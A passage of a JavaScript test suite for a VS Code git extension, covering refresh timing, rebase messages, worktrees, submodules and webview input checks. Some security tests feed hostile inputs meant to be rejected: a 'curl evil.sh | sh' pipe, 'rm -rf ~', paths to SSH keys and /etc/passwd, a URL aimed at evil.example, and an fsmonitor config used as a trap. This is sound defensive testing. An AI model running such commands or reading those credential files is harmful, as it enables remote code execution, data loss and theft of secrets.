  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.write('a.txt', '2\n');
  const [first, second] = await Promise.all([repo.refreshState(), repo.refreshState()]);
  assert.equal(first.unstaged.length, 1);
  assert.equal(second.unstaged.length, 1);
  repo.dispose();
});

test('files that never stop changing still get a refresh every few seconds', () => {
  const { refreshDelay } = requireWithVscode('../src/vscode/model');
  // A change every 150 ms for 4 s: the debounce alone would never fire.
  let fired = 0;
  let due = Infinity;
  let pendingSince = 0;
  for (let now = 0; now <= 4000; now += 150) {
    if (now >= due) {
      fired++;
      pendingSince = 0;
      due = Infinity;
    }
    if (!pendingSince) pendingSince = now;
    due = now + refreshDelay(now, pendingSince, 100);
  }
  assert.ok(fired >= 1, `refreshed ${fired} times while files kept changing`);
  assert.equal(refreshDelay(1000, 1000, 100), 300, 'a single change: the usual short debounce');
});

test('continuing a cherry-pick or rebase keeps a typed message that starts with "#"', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.git('checkout', '-q', '-b', 'side');
  r.commit('side change', { 'a.txt': 'side\n' });
  const side = r.git('rev-parse', 'HEAD');
  r.git('checkout', '-q', 'main');
  r.commit('main change', { 'a.txt': 'main\n' });
  // A conflicting cherry-pick, resolved, continued with a message the user typed.
  try {
    execFileSync('git', ['cherry-pick', side], { cwd: r.dir, stdio: 'ignore' });
  } catch { /* conflict expected */ }
  r.write('a.txt', 'resolved\n');
  r.git('add', 'a.txt');
  const message = '#123 fix things\n\nbody';
  await repo.writePendingMessage(message);
  await repo.continueOperation('cherry-pick', { message });
  assert.equal(r.git('log', '-1', '--format=%s'), '#123 fix things');
  assert.equal(r.git('log', '-1', '--format=%b').trim(), 'body');
  repo.dispose();
});

test('fetched pull requests of remote "up" are not mixed with those of "up/stream"', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const sha = r.git('rev-parse', 'HEAD');
  r.git('remote', 'add', 'up', r.dir);
  r.git('remote', 'add', 'up/stream', r.dir);
  r.git('update-ref', 'refs/commit-corner/pr/up/1/head', sha);
  r.git('update-ref', 'refs/commit-corner/pr/up/stream/5/head', sha);
  assert.deepEqual([...(await repo.getFetchedPullRequests('up')).keys()], [1]);
  assert.deepEqual([...(await repo.getFetchedPullRequests('up/stream')).keys()], [5]);
  repo.dispose();
});

test('scp-style remotes are read the way git reads them', () => {
  const { githubWebUrl } = require('../src/git/remoteUrl');
  assert.equal(githubWebUrl('git@github.com:o/r.git'), 'https://github.com/o/r');
  assert.equal(githubWebUrl('evil.example:x@github.com:o/r'), undefined, 'git connects to evil.example');
});

test('git never inherits variables that point it at another repository', async (t) => {
  const { r } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const other = createRepo();
  t.after(() => other.cleanup());
  other.commit('other', { 'b.txt': '2\n' });
  const saved = process.env.GIT_DIR;
  process.env.GIT_DIR = path.join(other.dir, '.git');
  t.after(() => (saved === undefined ? delete process.env.GIT_DIR : (process.env.GIT_DIR = saved)));
  const { git: run } = require('../src/git/exec');
  const { stdout } = await run(['log', '-1', '--format=%s'], { cwd: r.dir });
  assert.equal(stdout.trim(), 'base');
});

test('a committed symlink to another repository never makes git run there', { skip: process.platform === 'win32' }, async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const elsewhere = createRepo();
  t.after(() => elsewhere.cleanup());
  elsewhere.commit('other', { 'b.txt': '2\n' });
  const marker = path.join(elsewhere.dir, 'RAN');
  execFileSync('git', ['config', 'core.fsmonitor', `touch '${marker}'; false`], { cwd: elsewhere.dir });
  fs.symlinkSync(elsewhere.dir, path.join(r.dir, 'lnk'));
  r.git('add', 'lnk');
  r.git('commit', '-q', '-m', 'link');
  const { WORKTREE } = require('../src/git/repository');
  assert.equal(await repo.isOwnSubmodule(path.join(r.dir, 'lnk')), false);
  assert.equal(await repo.show(WORKTREE, 'lnk'), null);
  // An embedded repository that is not a recorded submodule is not run git in either.
  const embedded = createRepo();
  t.after(() => embedded.cleanup());
  fs.renameSync(embedded.dir, path.join(r.dir, 'vendor'));
  embedded.dir = path.join(r.dir, 'vendor');
  assert.equal(await repo.isOwnSubmodule(path.join(r.dir, 'vendor')), false);
  assert.equal(fs.existsSync(marker), false);
  repo.dispose();
});

test('a real submodule is still recognised (and diffed as "Subproject commit")', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const lib = createRepo();
  t.after(() => lib.cleanup());
  lib.commit('lib', { 'lib.txt': 'l\n' });
  r.git('-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', lib.dir, 'lib');
  assert.equal(await repo.isOwnSubmodule(path.join(r.dir, 'lib')), true);
  const { WORKTREE } = require('../src/git/repository');
  assert.match(String(await repo.show(WORKTREE, 'lib')), /^Subproject commit [0-9a-f]{40}/);
  repo.dispose();
});

test('graph pages cannot name revisions, paths or clipboard text freely', async () => {
  const { GraphPanel } = requireWithVscode('../src/vscode/webviews/graphPanel');
  const calls = [];
  const fake = { repo: { root: '/repo', absolute: (p) => `/repo/${p}` } };
  const vscode = requireWithVscode('vscode');
  const saved = vscode.commands.executeCommand;
  vscode.commands.executeCommand = async (...a) => calls.push(a);
  try {
    for (const file of [{ path: '../../.ssh/id_ed25519' }, { path: '/etc/passwd' }, { path: 'a.txt', beforeRef: '~worktree~' }, { path: 'a.txt', group: 'evil' }]) {
      await GraphPanel.prototype.openFile.call(fake, { kind: 'worktree', file: file });
      await GraphPanel.prototype.openFile.call(fake, { kind: 'commit', file, sha: 'a'.repeat(40), parent: ':/text' });
    }
    assert.deepEqual(calls, []);
    // A valid file of the working tree opens (exactly once): the checks above are not just "nothing works".
    await GraphPanel.prototype.openFile.call(fake, { kind: 'worktree', file: { path: 'src/a.txt', group: 'unstaged', status: 'M' } });
    assert.equal(calls.length, 1);
    assert.equal(calls[0][0], 'commitCorner.openResource');
    // The clipboard takes commit SHAs only, never other text (a shell command).
    calls.length = 0;
    const clip = [];
    const savedClip = vscode.env.clipboard;
    vscode.env.clipboard = { writeText: async (t) => clip.push(t) };
    try {
      const page = { repo: fake.repo, post() {} };
      const onMessage = (m) => GraphPanel.prototype.onMessage.call(page, m);
      await onMessage({ type: 'copy', text: 'curl evil.sh | sh' });
      await onMessage({ type: 'copy', text: `${'a'.repeat(40)}\nrm -rf ~` });
      assert.deepEqual(clip, []);
      await onMessage({ type: 'copy', text: 'b'.repeat(40) });
      assert.deepEqual(clip, ['b'.repeat(40)]);
    } finally {
      vscode.env.clipboard = savedClip;
    }
  } finally {
    vscode.commands.executeCommand = saved;
  }
});

test('staging from the graph acts only on files listed in their group', async () => {
  const { GraphPanel } = requireWithVscode('../src/vscode/webviews/graphPanel');
  const calls = [];
  const posted = [];
  const state = {
    head: { sha: 'a'.repeat(40) },
    conflicts: [],
    staged: [{ path: 'done.txt', x: 'M' }],
    unstaged: [{ path: 'src/a.js', y: 'M' }],
    untracked: [{ path: 'new.txt', y: '?' }],
  };
  const fake = {
    repo: { root: '/repo', refreshState: async () => state, revParse: async () => 'b'.repeat(40) },
    post: (m) => posted.push(m),
    sendFiles: async () => {},
    runWorktreeAction: GraphPanel.prototype.runWorktreeAction,
  };
  const vscode = requireWithVscode('vscode');
  const saved = vscode.commands.executeCommand;
  vscode.commands.executeCommand = async (id, arg) => calls.push([id, Array.isArray(arg) ? arg.map((a) => a.path).join(',') : arg && (arg.path || arg.id || arg.message || '')]);
  const act = (m) => GraphPanel.prototype.worktreeAction.call(fake, { repoRoot: '/repo', ...m });
  try {
    // Meant for another repository (the page still showed it): nothing runs.
    await act({ action: 'stage', group: 'unstaged', path: 'src/a.js', repoRoot: '/other' });
    await act({ action: 'commit', message: 'x', repoRoot: undefined });
    // Not listed, wrong group, or no such action: nothing runs.
    await act({ action: 'stage', group: 'unstaged', path: '../../.ssh/id_ed25519' });
    await act({ action: 'stage', group: 'staged', path: 'done.txt' });
    await act({ action: 'unstage', group: 'unstaged', path: 'src/a.js' });
    await act({ action: 'discard', group: 'staged', path: 'done.txt' });
    await act({ action: 'discard', group: 'evil', path: 'src/a.js' });
    await act({ action: 'stageGroup', group: 'staged' });
    await act({ action: 'discardGroup', group: 'staged' });
    await act({ action: 'runShell', group: 'unstaged', path: 'src/a.js' });
    await act({ action: 'stage', group: 'unstaged', folder: 'sr' }); // a folder is a whole name
    await act({ action: 'stage', group: 'unstaged', folder: '..' });
    assert.deepEqual(calls, []);
    // Listed files: the matching command, with the path from git's own list.
    await act({ action: 'stage', group: 'unstaged', path: 'src/a.js' });
    await act({ action: 'stage', group: 'unstaged', folder: 'src' }); // a folder: its files in that group
    await act({ action: 'unstage', group: 'staged', path: 'done.txt' });
    await act({ action: 'discard', group: 'untracked', path: 'new.txt' });
    await act({ action: 'stageGroup', group: 'untracked' });
    await act({ action: 'discardGroup', group: 'untracked' });
    await act({ action: 'commit', message: '--amend' });
    assert.deepEqual(calls, [
      ['commitCorner.stage', 'src/a.js'],
      ['commitCorner.stage', 'src/a.js'],
      ['commitCorner.unstage', 'done.txt'],
      ['commitCorner.discard', 'new.txt'],
      ['commitCorner.stageAll', 'untracked'],
      ['commitCorner.cleanAll', ''],
      ['commitCorner.commit', '--amend'], // the message is the message, never an option
    ]);
    assert.ok(posted.some((m) => m.type === 'wtCommitted'), 'HEAD moved: the message box is cleared');
    // While one action runs, another (a second Enter) is ignored.
    calls.length = 0;
    let release;
    vscode.commands.executeCommand = (id, arg) => new Promise((res) => { calls.push([id, arg.message]); release = res; });
    const first = act({ action: 'commit', message: 'one' });
    await new Promise((r) => setImmediate(r));
    await act({ action: 'commit', message: 'one' });
    release();
    await first;
    assert.deepEqual(calls, [['commitCorner.commit', 'one']]);
  } finally {
    vscode.commands.executeCommand = saved;
  }
});

test('files of a worktree nested in the repository are not the outer repository\'s', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'src/a.js': '1\n' });
  r.git('worktree', 'add', '-q', '-b', 'agent', path.join(r.dir, '.wt', 'agent'));
  const nestedFile = path.join(r.dir, '.wt', 'agent', 'src', 'a.js');
  fs.writeFileSync(nestedFile, '2\n');
  assert.equal(repo.contains(nestedFile), false);
  assert.equal(repo.contains(path.join(r.dir, 'src', 'a.js')), true);
  await assert.rejects(repo.writeIndexContent('.wt/agent/src/a.js', Buffer.from('2\n')), /nested/);
  assert.doesNotMatch(r.git('status', '--porcelain'), /^A /m, 'nothing staged in the outer repository');
  repo.dispose();
});

test('a refresh while an interactive rebase starts does not delete its plan', { skip: process.platform === 'win32' }, async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.commit('two', { 'a.txt': '2\n' });
  r.commit('three', { 'a.txt': '3\n' });
  const hook = path.join(r.dir, '.git', 'hooks', 'pre-rebase');
  fs.writeFileSync(hook, '#!/bin/sh\nsleep 1\n');
  fs.chmodSync(hook, 0o755);
  const [two, three] = [r.git('rev-parse', 'HEAD~1'), r.git('rev-parse', 'HEAD')];
  const base = r.git('rev-parse', 'HEAD~2');
  const rebase = repo.rebaseInteractive(base, [
    { type: 'commit', action: 'pick', sha: two, subject: 'two' },
    { type: 'commit', action: 'squash', sha: three, subject: 'three' },
  ]);
  await new Promise((res) => setTimeout(res, 300));
  await repo.refreshState(); // what a file watcher would do meanwhile
  await rebase;
  assert.equal(r.git('rev-list', '--count', 'HEAD'), '2', 'two and three squashed');
  repo.dispose();
});

test('the prepared message keeps a subject that starts with "#" (git\'s comment block is cut)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  fs.writeFileSync(path.join(r.dir, '.git', 'MERGE_MSG'), '#123 fix crash\n\nbody line\n\n# Conflicts:\n#\ta.txt\n');
  assert.equal(await repo.getPendingMessage(), '#123 fix crash\n\nbody line');
  fs.writeFileSync(path.join(r.dir, '.git', 'MERGE_MSG'), "Merge branch 'x'\n\n# Conflicts:\n#\ta.txt\n");
  assert.equal(await repo.getPendingMessage(), "Merge branch 'x'");
  repo.dispose();
});

test('a branch knows which branch it was created from', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.git('branch', 'dev');
  r.git('branch', 'agent', 'dev');
  assert.equal(await repo.createdFrom('agent'), 'dev');
  r.git('branch', 'other');
  assert.equal(await repo.createdFrom('other'), 'main', 'git names the branch HEAD was on');
  r.git('branch', 'pinned', r.git('rev-parse', 'HEAD'));
  assert.equal(await repo.createdFrom('pinned'), undefined, 'created from a bare SHA: unknown');
  r.commit('second', { 'a.txt': '2\n' });
  r.git('branch', 'moving', 'HEAD~1');
  r.git('tag', 'v1');
  r.git('branch', 'tagged', 'v1');
  assert.equal(await repo.createdFrom('moving'), undefined, 'an expression (HEAD~1) is no base');
  assert.equal(await repo.createdFrom('tagged'), undefined, 'a tag is no base');
  repo.dispose();
});

test('git never runs in an old worktree path that now holds another repository', { skip: process.platform === 'win32' }, async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const wt = `${r.dir}-wt`;
  t.after(() => fs.rmSync(wt, { recursive: true, force: true }));
  r.git('worktree', 'add', '-q', '-b', 'w', wt);
  fs.rmSync(wt, { recursive: true, force: true }); // deleted by hand, not pruned
  execFileSync('git', ['init', '-q', wt]);
  const marker = path.join(wt, 'RAN');
  execFileSync('git', ['config', 'core.fsmonitor', `touch '${marker}'; false`], { cwd: wt });
  assert.equal(await repo.ownsWorktree(wt), false);
  await repo.getWorktreeDetails();
  await assert.rejects(repo.worktreeChangesSince(wt, 'main'), /not a worktree/);
  assert.equal(fs.existsSync(marker), false);
  repo.dispose();
});

test('a repository nested in the working tree is never staged or listed for deletion as a file', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.git('worktree', 'add', '-q', '-b', 'agent', path.join(r.dir, '.wt', 'agent'));
  r.write('new.txt', 'n\n');
  const s = await repo.refreshState();
  assert.deepEqual(repo.nestedRepositories(s), ['.wt/agent/']);
  await repo.stageAll();
  const staged = r.git('diff', '--cached', '--name-only');
  assert.equal(staged, 'new.txt', 'only the real new file; no gitlink for the worktree');
  repo.dispose();
});

test('a repository deeper inside an untracked folder is nested too, in "normal" untracked mode', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.git('worktree', 'add', '-q', '-b', 'agent', path.join(r.dir, '.claude', 'worktrees', 'agent'));
  r.write('.claude/settings.json', '{}\n');
  r.write('other/new.txt', 'n\n');
  repo.untrackedMode = 'normal';
  const s = await repo.refreshState();
  assert.deepEqual(repo.nestedRepositories(s), ['.claude/worktrees/agent/']);
  // The folder holding it is listed file by file; other folders stay collapsed as in "normal".
  assert.deepEqual(s.untracked.map((e) => e.path).sort(), ['.claude/settings.json', 'other/']);
  await repo.stageAll();
  assert.deepEqual(r.git('diff', '--cached', '--name-only').split('\n').sort(), ['.claude/settings.json', 'other/new.txt'], 'no gitlink for the worktree');
  repo.dispose();
});

test('"normal" untracked mode: a big untracked folder stays one row unless a repository is inside it', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  fs.mkdirSync(path.join(r.dir, 'dump'));
  for (let k = 0; k < 5200; k++) fs.writeFileSync(path.join(r.dir, 'dump', `f${k}.txt`), '');
  repo.untrackedMode = 'normal';
  let s = await repo.refreshState();
  assert.deepEqual(s.untracked.map((e) => e.path), ['dump/'], 'too big to look through, and git finds no repository in it');
  fs.mkdirSync(path.join(r.dir, 'dump', 'zz'));
  r.git('worktree', 'add', '-q', '-b', 'deep', path.join(r.dir, 'dump', 'zz', 'agent'));
  s = await repo.refreshState();
  assert.deepEqual(repo.nestedRepositories(s), ['dump/zz/agent/']);
  assert.equal(s.untracked.length, 5200, 'listed file by file, the worktree left out');
  repo.dispose();
});

test('worktree polls share one status per worktree for a few seconds', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  for (let k = 0; k < 4; k++) r.git('worktree', 'add', '-q', '-b', `agent${k}`, path.join(r.dir, '.wt', `a${k}`));
  await repo.refreshState();
  const exec = require('../src/git/exec');
  let count = 0;
  exec.configure({ logger: () => count++ });
  t.after(() => exec.configure({ logger: () => {} }));
  const first = await repo.getWorktreeDetails();
  const firstCount = count;
  count = 0;
  const second = await repo.getWorktreeDetails();
  assert.deepEqual(second.map((w) => w.changes), first.map((w) => w.changes));
  assert.ok(count <= 2, `second poll: ${count} git processes (first: ${firstCount}): only the worktree list and their commits`);
  repo.dispose();
});

test('a SHA-256 repository: the first commit\'s files, a combined diff over it, untracked stash files', async (t) => {
  const dir = makeTempDir('cc-sha256-');
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const g = (...a) => execFileSync('git', a, { cwd: dir, encoding: 'utf8', env: { ...process.env, GIT_AUTHOR_NAME: 'T', GIT_AUTHOR_EMAIL: 't@x', GIT_COMMITTER_NAME: 'T', GIT_COMMITTER_EMAIL: 't@x' } }).trim();
  g('init', '-q', '--object-format=sha256', '-b', 'main');
  fs.writeFileSync(path.join(dir, 'a.txt'), '1\n');
  g('add', '-A');
  g('commit', '-q', '-m', 'first');
  fs.writeFileSync(path.join(dir, 'a.txt'), '2\n');
  g('commit', '-q', '-am', 'second');
  const repo = await Repository.open(dir);
  t.after(() => repo.dispose());
  assert.equal(repo.objectFormat, 'sha256');
  const root = g('rev-list', '--max-parents=0', 'HEAD');
  assert.equal(root.length, 64);
  const { files } = await repo.getCommitFiles(root);
  assert.deepEqual(files.map((f) => f.path), ['a.txt']);
  const { EMPTY_TREE } = require('../src/git/repository');
  assert.equal(await repo.show(EMPTY_TREE, 'a.txt'), null, 'the views\' empty tree means this repository\'s (no "bad revision")');
  assert.match(await repo.patchText(EMPTY_TREE, 'HEAD'), /\+2/);
});

test('a repository created deeper in an untracked folder right after a refresh is never staged', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  fs.mkdirSync(path.join(r.dir, '.claude', 'worktrees'), { recursive: true });
  fs.writeFileSync(path.join(r.dir, '.claude', 'settings.json'), '{}\n');
  repo.untrackedMode = 'normal';
  await repo.refreshState(); // ".claude/" holds no repository yet
  r.git('worktree', 'add', '-q', '-b', 'agent1', path.join(r.dir, '.claude', 'worktrees', 'agent1'));
  const s = await repo.refreshState(); // moments later
  assert.deepEqual(repo.nestedRepositories(s), ['.claude/worktrees/agent1/']);
  await repo.stageAll();
  assert.doesNotMatch(r.git('ls-files', '-s'), /^160000/m, 'no gitlink for the new worktree');
  repo.dispose();
});

test('commit --only with more paths than a command line holds (they go through a file)', async (t) => {
  const { r, repo } = await setup(t);
  const files = {};
  for (let k = 0; k < 300; k++) files[`deep/folder/structure/that/is/long/file-${k}.txt`] = '1\n';
  r.commit('base', { ...files, 'other.txt': 'o\n' });
  for (let k = 0; k < 300; k++) r.write(`deep/folder/structure/that/is/long/file-${k}.txt`, '2\n');
  r.write('other.txt', 'staged\n');
  r.git('add', 'other.txt');
  await repo.commit('only these', { only: Object.keys(files) });
  assert.equal(r.git('show', '--name-only', '--format=', 'HEAD').split('\n').length, 300);
  assert.equal(r.git('diff', '--cached', '--name-only'), 'other.txt', 'the other staged change stays staged');
  repo.dispose();
});

test('staging a folder looks for a repository created in it since the last status', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  fs.mkdirSync(path.join(r.dir, 'work'));
  fs.writeFileSync(path.join(r.dir, 'work', 'notes.txt'), 'n\n');
  repo.untrackedMode = 'normal';
  const s = await repo.refreshState(); // "work/" holds no repository yet
  assert.deepEqual(s.untracked.map((e) => e.path), ['work/']);
  r.git('worktree', 'add', '-q', '-b', 'wt', path.join(r.dir, 'work', 'wt'));
  await repo.stage(s.untracked.map((e) => e.path)); // the status is a moment old
  assert.doesNotMatch(r.git('ls-files', '-s'), /^160000/m, 'no gitlink for the new worktree');
  assert.match(r.git('diff', '--cached', '--name-only'), /work\/notes\.txt/);
  repo.dispose();
});

test('staging a submodule stages its new commit (a repository, but one git knows)', async (t) => {
  const { r, repo } = await setup(t);
  const sub = createRepo();
  t.after(() => fs.rmSync(sub.dir, { recursive: true, force: true }));
  sub.commit('sub base', { 's.txt': '1\n' });
  r.commit('base', { 'a.txt': '1\n' });
  r.git('-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', sub.dir, 'lib');
  r.git('commit', '-q', '-m', 'add lib');
  const lib = path.join(r.dir, 'lib');
  fs.writeFileSync(path.join(lib, 's.txt'), '2\n');
  execFileSync('git', ['-C', lib, '-c', 'user.name=t', '-c', 'user.email=t@e', 'commit', '-qam', 'sub change']);
  await repo.refreshState();
  await repo.stage(['lib']);
  assert.match(r.git('diff', '--cached', '--name-only'), /^lib$/m, 'the submodule\'s new commit is staged');
  repo.dispose();
});

test('a combined diff is approximate only for the files that need unselected commits', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': '1\n', 'h.txt': 'h\n' });
  const s1 = r.commit('s1', { 'g.txt': 'g\n' });
  r.commit('unselected', { 'f.txt': '2\n' });
  const s3 = r.commit('s3 builds on it, and edits h', { 'f.txt': '3\n', 'h.txt': 'h2\n' });
  const res = await repo.getMultiCommitChanges([s1, s3]);
  assert.equal(res.exact, false);
  assert.deepEqual(res.failed, [s3]);
  assert.deepEqual(res.approximate, ['f.txt']);
  const byPath = new Map(res.files.map((f) => [f.path, f]));
  assert.equal(byPath.get('f.txt').approximate, true);
  assert.ok(!byPath.get('h.txt').approximate && byPath.get('h.txt').afterRef === res.tree, 'h.txt is exact (from the replayed tree)');
  assert.equal(String(await repo.show(res.tree, 'h.txt')), 'h2\n');
  assert.ok(!byPath.get('g.txt').approximate);
});
